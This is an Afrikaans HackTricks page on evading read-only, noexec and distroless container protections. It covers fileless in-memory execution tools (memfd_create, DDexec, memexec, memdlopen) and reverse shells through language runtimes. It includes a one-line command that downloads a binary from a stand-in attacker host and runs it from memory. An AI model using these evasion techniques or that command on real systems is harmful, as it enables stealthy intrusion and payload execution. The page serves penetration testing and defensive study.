# Omseil FS-beskerming: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Video's

In die volgende video's word die tegnieke wat op hierdie bladsy genoem word, in meer besonderhede verduidelik:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec-scenario

In 'n container kan jy die root-lêerstelsel as read-only mount deur **`readOnlyRootFilesystem: true`** in die security context te stel.<sup>[[3]](#references)</sup> Byvoorbeeld:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

'n Read-only root maak nie afsonderlik gemounte volumes read-only nie. Docker behandel **`/dev/shm`** as 'n IPC-mount, terwyl tmpfs-opsies soos `rw` en `noexec` runtime-konfigurasiekeuses is; inspekteer die teikencontainer se mount-opsies voordat jy op enige van hierdie gedrag staatmaak.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Vanuit 'n red-team-perspektief kan daardie kombinasie dit moeilik maak om binaries af te laai en uit te voer wat nie reeds beskikbaar is nie (byvoorbeeld backdoors of enumeration tools).<sup>[[4]](#references)[[5]](#references)</sup>

## Maklikste omseiling: Scripts

'n `noexec`-mount blokkeer direkte uitvoering van binaries op daardie mount, maar 'n interpreter kan steeds 'n script lees en interpreteer. As `sh` of `python` teenwoordig is, kan jy dus 'n shell- of Python-script deur daardie interpreter uitvoer.<sup>[[5]](#references)</sup>

Dit help nie wanneer die vereiste tool self 'n binary is nie.<sup>[[5]](#references)</sup>

## Memory-omseilings

Wanneer direkte uitvoering vanaf 'n gemounte pad geblokkeer word, is een opsie om die ELF in memory te laai en dit deur 'n in-memory pad uit te voer. Dit vermy die `noexec`-kontrole op daardie mount, maar verwyder nie ander kernel-, permission- of policy-kontroles nie.<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall-omseiling

As 'n scripting runtime toegang tot die relevante Linux-interface kan verkry, kan dit 'n anonieme, RAM-gesteunde file descriptor met **`memfd_create(2)`** skep, die ELF-bytes daarheen skryf en 'n fd-gesteunde uitvoeringspad gebruik. Die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) genereer compressed en base64-encoded Python-, Perl- of Ruby-kode vir hierdie workflow.<sup>[[6]](#references)[[7]](#references)</sup>

Die projek dokumenteer tans Python-, Perl- en Ruby-teikens; PHP of Node benodig 'n ander runtime-spesifieke tegniek of extension, dus beteken die afwesigheid van hierdie generator vir 'n taal nie dat in-memory execution onmoontlik is nie.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> 'n Gewone executable wat na **`/dev/shm`** geskryf word, bly onderhewig aan daardie mount se **`noexec`**-instelling; om dit bloot deur 'n gewone file descriptor oop te maak, verander nie die mount policy nie.<sup>[[5]](#references)</sup>
>
> Die presiese memory-execution-metode hang ook af van die runtime, argitektuur, kernel en beskikbare permissions.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) skryf 'n stager en loader in die lopende shell-proses deur **`/proc/self/mem`**, en dra dan beheer aan daardie kode oor.<sup>[[8]](#references)</sup>

Dit stel die proses in staat om 'n verskafte binary te laai sonder om daardie binary eers op 'n executable filesystem te plaas.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** kan shellcode of 'n binary vanaf **memory** laai en **uitvoer**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Vir meer inligting oor hierdie tegniek, kyk na GitHub of:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is ’n daemonized DDexec-implementering. Sy daemon luister na versoeke wat argumente en rou programgrepe bevat, fork ’n child om elke program te laai en uit te voer, en hou die parent as die server.<sup>[[9]](#references)</sup>

Die repository sluit ’n voorbeeld in van hoe om **memexec te gebruik om binaries vanuit ’n PHP reverse shell uit te voer** in [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Met ’n soortgelyke doel as DDexec is [**memdlopen**](https://github.com/arget13/memdlopen) ’n fileless `dlopen()`-implementering vir ’n shared object of program. Die README dokumenteer tans ARM64-ondersteuning, dus moet jy die target-argitektuur nagaan voordat jy dit gebruik.<sup>[[10]](#references)</sup>

## Distroless Bypass

Vir ’n toegewyde verduideliking van **wat distroless werklik is**, wanneer dit help, wanneer dit nie help nie, en hoe dit post-exploitation tradecraft in containers verander, kyk na:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Wat is distroless

Distroless-images bevat slegs die toepassing en sy runtime-dependencies; die amptelike images laat package managers, shells en ander programme wat in ’n standaard Linux-distribution verwag word, weg.<sup>[[11]](#references)</sup>

Deur die runtime-image tot daardie dependencies te beperk, word die sagteware wat in production teenwoordig is en die hoeveelheid wat geskandeer en nagespoor moet word, verminder.<sup>[[11]](#references)</sup>

### Reverse Shell

In ’n distroless-container sal jy moontlik **nie `sh` of `bash`** vir ’n gewone shell vind nie, en ook nie algemene utilities soos `ls`, `whoami` of `id` nie.<sup>[[11]](#references)</sup>

> [!WARNING]
> Daarom sal ’n gewone shell-based reverse shell of utility-based enumeration moontlik nie werk nie.<sup>[[11]](#references)</sup>

As die compromised application ’n language runtime insluit (byvoorbeeld Python vir ’n Flask application of Node.js vir ’n Node application), kan ’n RCE moontlik steeds daardie runtime gebruik vir ’n command channel en system inspection deur sy APIs.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Gebruik die beskikbare scripting language om **die system te enumerate** deur sy language capabilities.<sup>[[12]](#references)</sup>

As daar geen **read-only/no-exec**-protections is nie, kan ’n command channel binaries na ’n writable, executable mount skryf en dit uitvoer; verifieer eers die mount options en permissions.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Wanneer hierdie protections teenwoordig is, gebruik die **memory-execution techniques hierbo** waar die runtime, kernel en permissions dit toelaat.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Jy kan **voorbeelde** vind van die exploitation van RCE-vulnerabilities om scripting-language **reverse shells** te verkry en binaries vanuit memory uit te voer in [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Verkenning van Linux-geheueemanipulasie vir stealth en ontduiking](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth-intrusions met DDexec-ng en in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Konfigureer ’n security context vir ’n pod of container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux-manblad](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux-manblad](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
